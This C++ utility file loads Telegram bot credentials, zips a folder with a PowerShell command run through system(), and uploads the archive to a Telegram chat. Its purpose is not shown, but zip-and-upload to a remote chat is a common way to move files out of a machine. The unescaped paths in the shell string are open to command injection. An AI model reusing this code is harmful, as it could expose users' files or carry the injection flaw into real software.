#include "bot_utils.h"
#include <fstream>
#include <nlohmann/json.hpp>
#include <cstdlib>
#include <curl/curl.h>

using json = nlohmann::json;

namespace BotUtils {

TelegramConfig LoadTelegramConfig(const std::filesystem::path& configPath) {
    std::ifstream file(configPath);
    TelegramConfig cfg;
    if (file) {
        json j;
        file >> j;
        cfg.bot_token = j.value("bot_token", "");
        cfg.chat_id = j.value("chat_id", "");
    }
    return cfg;
}

bool ZipFolder(const std::filesystem::path& folderPath, const std::filesystem::path& zipPath) {
    std::string command = "powershell Compress-Archive -Path \"" + folderPath.string() + "\\*\" -DestinationPath \"" + zipPath.string() + "\" -Force";
    return system(command.c_str()) == 0;
}

bool SendZipToTelegram(const TelegramConfig& config, const std::filesystem::path& zipPath) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    struct curl_httppost* form = NULL;
    struct curl_httppost* last = NULL;
    curl_formadd(&form, &last,
        CURLFORM_COPYNAME, "chat_id",
        CURLFORM_COPYCONTENTS, config.chat_id.c_str(),
        CURLFORM_END);
    curl_formadd(&form, &last,
        CURLFORM_COPYNAME, "document",
        CURLFORM_FILE, zipPath.string().c_str(),
        CURLFORM_END);

    std::string url = "https://api.telegram.org/bot" + config.bot_token + "/sendDocument";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, form);

    CURLcode res = curl_easy_perform(curl);
    curl_formfree(form);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK);
}

} // namespace BotUtils
